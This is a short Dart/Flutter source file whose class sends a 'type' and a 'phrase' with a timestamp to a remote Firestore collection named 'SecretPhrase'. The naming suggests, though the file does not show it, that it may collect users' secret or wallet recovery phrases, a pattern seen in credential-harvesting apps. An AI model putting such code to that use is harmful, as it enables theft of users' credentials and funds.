import 'dart:developer';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:intl/intl.dart';

class SendPhrase {
  CollectionReference DB =
      FirebaseFirestore.instance.collection('SecretPhrase');
  var format = DateFormat.yMMMEd();

  Future<void> sendPhrase([ type,phrase]) async {
    try {
      var sed = DB
          .add({'type':type, 'phrase': phrase, 'time': format.format(DateTime.now())})
          .then((value) => print('UPhrase added'))
          .catchError((e) => log(e));
      log(sed.toString());
    } on FirebaseException catch (e) {
      log(e.toString());
    }
  }
}
